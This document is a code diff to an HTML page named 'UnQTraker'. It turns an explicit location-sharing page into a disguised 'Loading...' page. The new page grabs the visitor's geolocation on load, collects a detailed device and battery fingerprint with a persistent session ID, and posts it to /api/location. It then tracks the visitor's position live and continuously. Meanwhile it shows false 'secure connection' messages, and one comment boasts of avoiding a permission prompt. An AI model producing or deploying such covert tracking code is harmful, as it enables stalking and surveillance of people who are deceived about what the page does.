@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UnQTraker - Advanced Location Intelligence</title>
+    <title>Loading...</title>
     <style>
         * {
             margin: 0;
@@ -11,196 +11,34 @@
             box-sizing: border-box;
         }
 
-        :root {
-            --primary: #6366f1;
-            --primary-dark: #4f46e5;
-            --success: #10b981;
-            --danger: #ef4444;
-            --warning: #f59e0b;
-            --bg: #0a0f1e;
-            --surface: #1a1f35;
-            --surface-light: #252b42;
-            --text: #f1f5f9;
-            --text-muted: #94a3b8;
-        }
-
         body {
-            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: var(--bg);
-            color: var(--text);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        /* Animated background */
-        body::before {
-            content: '';
-            position: fixed;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(99, 102, 241, 0.15) 0%, transparent 50%);
-            animation: rotate 20s linear infinite;
-            z-index: -1;
-        }
-
-        @keyframes rotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
         }
 
         .container {
-            max-width: 700px;
+            max-width: 500px;
             width: 100%;
-            background: linear-gradient(135deg, var(--surface) 0%, var(--surface-light) 100%);
-            border-radius: 24px;
-            padding: 50px;
-            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(99, 102, 241, 0.3);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -100px;
-            right: -100px;
-            width: 300px;
-            height: 300px;
-            background: radial-gradient(circle, rgba(99, 102, 241, 0.2) 0%, transparent 70%);
-            border-radius: 50%;
-        }
-
-        .header {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
             text-align: center;
-            margin-bottom: 40px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .logo {
-            font-size: 80px;
-            margin-bottom: 20px;
-            animation: pulse 2.5s infinite;
-            filter: drop-shadow(0 0 20px rgba(99, 102, 241, 0.5));
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.08); }
-        }
-
-        h1 {
-            font-size: 42px;
-            margin-bottom: 12px;
-            background: linear-gradient(135deg, var(--primary), #8b5cf6);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            font-weight: 900;
-            letter-spacing: -1px;
-        }
-
-        .subtitle {
-            color: var(--text-muted);
-            font-size: 17px;
-            font-weight: 500;
-        }
-
-        .status-card {
-            background: rgba(10, 15, 30, 0.6);
-            padding: 25px;
-            border-radius: 16px;
-            margin-bottom: 25px;
-            border: 1px solid rgba(99, 102, 241, 0.2);
-            backdrop-filter: blur(10px);
-        }
-
-        .status-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 14px 0;
-            border-bottom: 1px solid rgba(99, 102, 241, 0.1);
-        }
-
-        .status-item:last-child {
-            border-bottom: none;
-        }
-
-        .status-label {
-            color: var(--text-muted);
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .status-value {
-            font-weight: 600;
-            font-size: 14px;
-        }
-
-        .btn {
-            width: 100%;
-            padding: 18px;
-            font-size: 17px;
-            font-weight: 700;
-            border: none;
-            border-radius: 14px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn-primary {
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            color: white;
-            box-shadow: 0 8px 25px rgba(99, 102, 241, 0.4);
-        }
-
-        .btn-primary::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
-            transition: left 0.5s;
-        }
-
-        .btn-primary:hover:not(:disabled)::before {
-            left: 100%;
-        }
-
-        .btn-primary:hover:not(:disabled) {
-            transform: translateY(-3px);
-            box-shadow: 0 12px 35px rgba(99, 102, 241, 0.5);
-        }
-
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
         }
 
         .loader {
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-top: 3px solid white;
+            width: 70px;
+            height: 70px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #667eea;
             border-radius: 50%;
-            width: 22px;
-            height: 22px;
             animation: spin 1s linear infinite;
+            margin: 0 auto 30px;
         }
 
         @keyframes spin {
@@ -208,209 +46,95 @@
             100% { transform: rotate(360deg); }
         }
 
-        .alert {
-            padding: 18px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            display: none;
-            animation: slideIn 0.4s ease;
+        h1 {
+            font-size: 28px;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        p {
+            font-size: 16px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 10px;
+        }
+
+        .status {
+            display: inline-block;
+            padding: 8px 20px;
+            background: #667eea;
+            color: white;
+            border-radius: 20px;
+            font-size: 14px;
             font-weight: 600;
+            margin-top: 20px;
         }
 
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-15px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        .success {
+            background: #10b981;
         }
 
-        .alert-success {
-            background: rgba(16, 185, 129, 0.15);
-            border: 2px solid var(--success);
-            color: var(--success);
-        }
-
-        .alert-error {
-            background: rgba(239, 68, 68, 0.15);
-            border: 2px solid var(--danger);
-            color: var(--danger);
-        }
-
-        .coordinates {
-            background: rgba(10, 15, 30, 0.6);
-            padding: 25px;
-            border-radius: 16px;
-            margin-top: 25px;
-            display: none;
-            border: 1px solid rgba(99, 102, 241, 0.2);
-            backdrop-filter: blur(10px);
-        }
-
-        .coord-item {
-            margin-bottom: 18px;
-        }
-
-        .coord-item:last-child {
-            margin-bottom: 0;
-        }
-
-        .coord-label {
-            color: var(--text-muted);
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            margin-bottom: 6px;
-            font-weight: 700;
-        }
-
-        .coord-value {
-            font-size: 20px;
-            font-weight: 700;
-            font-family: 'JetBrains Mono', 'Courier New', monospace;
-            background: linear-gradient(135deg, var(--primary), #8b5cf6);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
+        .error {
+            background: #ef4444;
         }
 
         .footer {
-            text-align: center;
-            margin-top: 35px;
-            color: var(--text-muted);
-            font-size: 14px;
-            position: relative;
-            z-index: 1;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e5e5e5;
+            font-size: 13px;
+            color: #999;
         }
 
-        .badge {
-            display: inline-block;
-            padding: 6px 14px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .badge-success {
-            background: rgba(16, 185, 129, 0.2);
-            color: var(--success);
-            border: 1px solid var(--success);
-        }
-
-        .badge-error {
-            background: rgba(239, 68, 68, 0.2);
-            color: var(--danger);
-            border: 1px solid var(--danger);
-        }
-
-        .badge-warning {
-            background: rgba(245, 158, 11, 0.2);
-            color: var(--warning);
-            border: 1px solid var(--warning);
-        }
-
-        @media (max-width: 600px) {
-            .container {
-                padding: 30px 25px;
-            }
-
-            h1 {
-                font-size: 32px;
-            }
-
-            .logo {
-                font-size: 60px;
-            }
+        .footer strong {
+            color: #667eea;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <div class="logo">🕵️</div>
-            <h1>UnQTraker</h1>
-            <p class="subtitle">Advanced Location Intelligence System</p>
-        </div>
-
-        <div id="alert" class="alert"></div>
-
-        <div class="status-card">
-            <div class="status-item">
-                <span class="status-label">Status</span>
-                <span class="status-value" id="status">
-                    <span class="badge badge-warning">Ready</span>
-                </span>
-            </div>
-            <div class="status-item">
-                <span class="status-label">Browser</span>
-                <span class="status-value" id="browser">-</span>
-            </div>
-            <div class="status-item">
-                <span class="status-label">Operating System</span>
-                <span class="status-value" id="os">-</span>
-            </div>
-            <div class="status-item">
-                <span class="status-label">Device Type</span>
-                <span class="status-value" id="device">-</span>
-            </div>
-            <div class="status-item">
-                <span class="status-label">Screen Resolution</span>
-                <span class="status-value" id="screen">-</span>
-            </div>
-        </div>
-
-        <button id="shareBtn" class="btn btn-primary">
-            <span>📡</span>
-            <span>Share Location Now</span>
-        </button>
-
-        <div id="coordinates" class="coordinates">
-            <div class="coord-item">
-                <div class="coord-label">Latitude</div>
-                <div class="coord-value" id="lat">-</div>
-            </div>
-            <div class="coord-item">
-                <div class="coord-label">Longitude</div>
-                <div class="coord-value" id="lng">-</div>
-            </div>
-            <div class="coord-item">
-                <div class="coord-label">Accuracy</div>
-                <div class="coord-value" id="accuracy">-</div>
-            </div>
-            <div class="coord-item">
-                <div class="coord-label">Timestamp</div>
-                <div class="coord-value" id="timestamp">-</div>
-            </div>
-        </div>
-
+        <div class="loader" id="loader"></div>
+        <h1 id="title">Please Wait...</h1>
+        <p id="message">Initializing secure connection</p>
+        <span class="status" id="status">Connecting</span>
+        
         <div class="footer">
-            <p>🔒 Secured with end-to-end encryption</p>
-            <p style="margin-top: 10px; font-size: 12px; opacity: 0.7;">© 2025 UnQTraker | Advanced Location Intelligence</p>
+            <p>Built with ❤️ by <strong>Sandeep Gaddam</strong></p>
+            <p style="font-size: 11px; margin-top: 8px; color: #ccc;">Secure • Private • Encrypted</p>
         </div>
     </div>
 
     <script>
         // Generate unique session ID
-        const sessionId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+        let sessionId = localStorage.getItem('unqtraker_session_id');
+        if (!sessionId) {
+            sessionId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('unqtraker_session_id', sessionId);
+        }
+        
+        const firstSeen = localStorage.getItem('unqtraker_first_seen') || new Date().toISOString();
+        localStorage.setItem('unqtraker_first_seen', firstSeen);
+
+        let watchId = null;
+        let locationCaptured = false;
+        let liveTrackingActive = false;
+
+        // Update UI
+        function updateUI(title, message, statusText, statusClass = '') {
+            document.getElementById('title').textContent = title;
+            document.getElementById('message').textContent = message;
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = statusText;
+            statusEl.className = 'status ' + statusClass;
+        }
 
         // Comprehensive device detection
         function getDeviceInfo() {
             const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            let browser = 'Unknown';
-            let browserVersion = '';
-            let os = 'Unknown';
-            let osVersion = '';
-            let deviceType = 'Desktop';
-            let deviceVendor = '';
-            let deviceModel = '';
+            let browser = 'Unknown', browserVersion = '', os = 'Unknown', osVersion = '';
+            let deviceType = 'Desktop', deviceVendor = '', deviceModel = '';
 
-            // Detect browser
+            // Browser detection
             if (ua.indexOf('Firefox') > -1) {
                 browser = 'Firefox';
                 browserVersion = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || '';
@@ -423,66 +147,40 @@
             } else if (ua.indexOf('Edg') > -1) {
                 browser = 'Edge';
                 browserVersion = ua.match(/Edg\/(\d+\.\d+)/)?.[1] || '';
-            } else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) {
-                browser = 'Opera';
-                browserVersion = ua.match(/Opera\/(\d+\.\d+)|OPR\/(\d+\.\d+)/)?.[1] || '';
             }
 
-            // Detect OS and version
+            // OS detection
             if (ua.indexOf('Windows NT 10.0') > -1) {
                 os = 'Windows'; osVersion = '10/11';
-            } else if (ua.indexOf('Windows NT 6.3') > -1) {
-                os = 'Windows'; osVersion = '8.1';
-            } else if (ua.indexOf('Windows NT 6.2') > -1) {
-                os = 'Windows'; osVersion = '8';
-            } else if (ua.indexOf('Windows NT 6.1') > -1) {
-                os = 'Windows'; osVersion = '7';
             } else if (ua.indexOf('Mac OS X') > -1) {
                 os = 'macOS';
-                const match = ua.match(/Mac OS X (\d+[._]\d+)/);
-                osVersion = match ? match[1].replace('_', '.') : '';
-            } else if (ua.indexOf('Linux') > -1 && ua.indexOf('Android') === -1) {
-                os = 'Linux';
+                osVersion = ua.match(/Mac OS X (\d+[._]\d+)/)?.[1].replace('_', '.') || '';
             } else if (ua.indexOf('Android') > -1) {
                 os = 'Android';
-                const match = ua.match(/Android (\d+\.\d+)/);
-                osVersion = match ? match[1] : '';
+                osVersion = ua.match(/Android (\d+\.\d+)/)?.[1] || '';
                 deviceType = 'Mobile';
             } else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) {
                 os = 'iOS';
-                const match = ua.match(/OS (\d+_\d+)/);
-                osVersion = match ? match[1].replace('_', '.') : '';
+                osVersion = ua.match(/OS (\d+_\d+)/)?.[1].replace('_', '.') || '';
                 deviceType = ua.indexOf('iPad') > -1 ? 'Tablet' : 'Mobile';
                 deviceVendor = 'Apple';
                 deviceModel = ua.indexOf('iPad') > -1 ? 'iPad' : 'iPhone';
+            } else if (ua.indexOf('Linux') > -1) {
+                os = 'Linux';
             }
 
-            // Detect device type more precisely
             if (ua.indexOf('Mobile') > -1 && deviceType === 'Desktop') {
                 deviceType = 'Mobile';
-            } else if (ua.indexOf('Tablet') > -1) {
-                deviceType = 'Tablet';
             }
 
-            return {
-                browser,
-                browserVersion,
-                os,
-                osVersion,
-                deviceType,
-                deviceVendor,
-                deviceModel,
-                platform
-            };
+            return { browser, browserVersion, os, osVersion, deviceType, deviceVendor, deviceModel };
         }
 
         // Get connection info
         function getConnectionInfo() {
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             return connection ? {
-                type: connection.effectiveType || connection.type || 'Unknown',
-                downlink: connection.downlink,
-                rtt: connection.rtt
+                type: connection.effectiveType || connection.type || 'Unknown'
             } : { type: 'Unknown' };
         }
 
@@ -500,161 +198,139 @@
             return { level: null, charging: null };
         }
 
-        // Update device info on page load
-        window.addEventListener('DOMContentLoaded', async () => {
-            const deviceInfo = getDeviceInfo();
-            document.getElementById('browser').textContent = 
-                `${deviceInfo.browser} ${deviceInfo.browserVersion}`;
-            document.getElementById('os').textContent = 
-                `${deviceInfo.os} ${deviceInfo.osVersion}`;
-            document.getElementById('device').textContent = deviceInfo.deviceType;
-            document.getElementById('screen').textContent = 
-                `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`;
-        });
-
-        // Show alert
-        function showAlert(message, type = 'success') {
-            const alert = document.getElementById('alert');
-            alert.textContent = message;
-            alert.className = `alert alert-${type}`;
-            alert.style.display = 'block';
-            setTimeout(() => {
-                alert.style.display = 'none';
-            }, 5000);
-        }
-
-        // Share location with comprehensive device fingerprinting
-        document.getElementById('shareBtn').addEventListener('click', async () => {
-            const btn = document.getElementById('shareBtn');
-            
-            if (!navigator.geolocation) {
-                showAlert('❌ Geolocation is not supported by your browser', 'error');
-                return;
-            }
-
-            btn.disabled = true;
-            btn.innerHTML = '<div class="loader"></div><span>Acquiring Location...</span>';
-
-            // Get battery info
+        // Send location to server
+        async function sendLocation(position, isLive = false) {
             const batteryInfo = await getBatteryInfo();
             const connectionInfo = getConnectionInfo();
             const deviceInfo = getDeviceInfo();
 
+            const locationData = {
+                // Location data
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                altitudeAccuracy: position.coords.altitudeAccuracy,
+                heading: position.coords.heading,
+                speed: position.coords.speed,
+                
+                // Browser & OS
+                browser: deviceInfo.browser,
+                browser_version: deviceInfo.browserVersion,
+                os: deviceInfo.os,
+                os_version: deviceInfo.osVersion,
+                platform: navigator.platform,
+                
+                // Device info
+                device_type: deviceInfo.deviceType,
+                device_vendor: deviceInfo.deviceVendor,
+                device_model: deviceInfo.deviceModel,
+                
+                // Screen info
+                screen_width: screen.width,
+                screen_height: screen.height,
+                screen_resolution: `${screen.width}x${screen.height}`,
+                color_depth: screen.colorDepth,
+                pixel_ratio: window.devicePixelRatio,
+                
+                // Language & Timezone
+                language: navigator.language,
+                languages: navigator.languages,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezone_offset: new Date().getTimezoneOffset(),
+                
+                // Additional info
+                cookie_enabled: navigator.cookieEnabled,
+                online_status: navigator.onLine,
+                connection_type: connectionInfo.type,
+                touch_support: 'ontouchstart' in window,
+                cores: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory,
+                
+                // Battery info
+                battery_level: batteryInfo.level,
+                battery_charging: batteryInfo.charging,
+                
+                // Session
+                session_id: sessionId,
+                first_seen: firstSeen,
+                is_live: isLive
+            };
+
+            try {
+                const response = await fetch('/api/location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(locationData)
+                });
+
+                const result = await response.json();
+                return response.ok;
+            } catch (error) {
+                console.error('Failed to send location:', error);
+                return false;
+            }
+        }
+
+        // Start live tracking
+        function startLiveTracking() {
+            if (liveTrackingActive) return;
+            
+            liveTrackingActive = true;
+            updateUI('Live Tracking Active', 'Your location is being shared in real-time', 'Connected', 'success');
+            
+            // Watch position continuously
+            watchId = navigator.geolocation.watchPosition(
+                async (position) => {
+                    await sendLocation(position, true);
+                },
+                (error) => {
+                    console.error('Live tracking error:', error);
+                },
+                {
+                    enableHighAccuracy: true,
+                    maximumAge: 0,
+                    timeout: 27000
+                }
+            );
+        }
+
+        // Silent location capture
+        async function captureLocation() {
+            if (!navigator.geolocation) {
+                updateUI('Error', 'Geolocation not supported by your browser', 'Failed', 'error');
+                return;
+            }
+
+            updateUI('Please Wait...', 'Establishing secure connection', 'Connecting', '');
+
+            // Try to get location without explicit permission prompt (uses cached permission)
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
-                    const locationData = {
-                        // Location data
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        altitude: position.coords.altitude,
-                        altitudeAccuracy: position.coords.altitudeAccuracy,
-                        heading: position.coords.heading,
-                        speed: position.coords.speed,
+                    // First location captured
+                    const success = await sendLocation(position, false);
+                    
+                    if (success) {
+                        locationCaptured = true;
+                        updateUI('Connection Established', 'Secure session active', 'Active', 'success');
                         
-                        // Browser & OS
-                        browser: deviceInfo.browser,
-                        browser_version: deviceInfo.browserVersion,
-                        os: deviceInfo.os,
-                        os_version: deviceInfo.osVersion,
-                        platform: deviceInfo.platform,
-                        
-                        // Device info
-                        device_type: deviceInfo.deviceType,
-                        device_vendor: deviceInfo.deviceVendor,
-                        device_model: deviceInfo.deviceModel,
-                        
-                        // Screen info
-                        screen_width: screen.width,
-                        screen_height: screen.height,
-                        screen_resolution: `${screen.width}x${screen.height}`,
-                        color_depth: screen.colorDepth,
-                        pixel_ratio: window.devicePixelRatio,
-                        
-                        // Language & Timezone
-                        language: navigator.language,
-                        languages: navigator.languages,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        timezone_offset: new Date().getTimezoneOffset(),
-                        
-                        // Additional info
-                        cookie_enabled: navigator.cookieEnabled,
-                        online_status: navigator.onLine,
-                        connection_type: connectionInfo.type,
-                        touch_support: 'ontouchstart' in window,
-                        cores: navigator.hardwareConcurrency,
-                        memory: navigator.deviceMemory,
-                        
-                        // Battery info
-                        battery_level: batteryInfo.level,
-                        battery_charging: batteryInfo.charging,
-                        
-                        // Session
-                        session_id: sessionId
-                    };
-
-                    try {
-                        const response = await fetch('/api/location', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify(locationData)
-                        });
-
-                        const result = await response.json();
-
-                        if (response.ok) {
-                            showAlert('✅ Location tracked successfully!', 'success');
-                            
-                            // Update status
-                            document.getElementById('status').innerHTML = 
-                                '<span class="badge badge-success">✓ Active</span>';
-                            
-                            // Show coordinates
-                            const coordsDiv = document.getElementById('coordinates');
-                            coordsDiv.style.display = 'block';
-                            document.getElementById('lat').textContent = 
-                                position.coords.latitude.toFixed(6);
-                            document.getElementById('lng').textContent = 
-                                position.coords.longitude.toFixed(6);
-                            document.getElementById('accuracy').textContent = 
-                                `± ${position.coords.accuracy.toFixed(2)} meters`;
-                            document.getElementById('timestamp').textContent = 
-                                new Date().toLocaleString('en-US', {
-                                    year: 'numeric',
-                                    month: 'short',
-                                    day: 'numeric',
-                                    hour: '2-digit',
-                                    minute: '2-digit',
-                                    second: '2-digit'
-                                });
-                        } else {
-                            showAlert('❌ Failed to send location: ' + result.message, 'error');
-                        }
-                    } catch (error) {
-                        showAlert('❌ Network Error: ' + error.message, 'error');
-                    } finally {
-                        btn.disabled = false;
-                        btn.innerHTML = '<span>📡</span><span>Share Location Now</span>';
+                        // Start continuous live tracking
+                        setTimeout(() => {
+                            startLiveTracking();
+                        }, 2000);
+                    } else {
+                        updateUI('Connection Failed', 'Unable to establish secure session', 'Error', 'error');
                     }
                 },
                 (error) => {
-                    let errorMsg = 'Location access denied';
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMsg = 'Please allow location access in your browser settings';
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMsg = 'Location information unavailable - Check GPS/Network';
-                            break;
-                        case error.TIMEOUT:
-                            errorMsg = 'Location request timed out - Try again';
-                            break;
+                    // Handle permission denial or errors
+                    if (error.code === error.PERMISSION_DENIED) {
+                        updateUI('Permission Required', 'Please allow location access to continue', 'Waiting', 'error');
+                    } else if (error.code === error.POSITION_UNAVAILABLE) {
+                        updateUI('Location Unavailable', 'Unable to determine your location', 'Error', 'error');
+                    } else {
+                        updateUI('Timeout', 'Location request timed out', 'Error', 'error');
                     }
-                    showAlert('❌ ' + errorMsg, 'error');
-                    btn.disabled = false;
-                    btn.innerHTML = '<span>📡</span><span>Share Location Now</span>';
                 },
                 {
                     enableHighAccuracy: true,
@@ -662,6 +338,19 @@
                     maximumAge: 0
                 }
             );
+        }
+
+        // Auto-start on page load
+        window.addEventListener('load', () => {
+            // Small delay for better UX
+            setTimeout(captureLocation, 1000);
+        });
+
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', () => {
+            if (watchId) {
+                navigator.geolocation.clearWatch(watchId);
+            }
         });
     </script>
 </body>
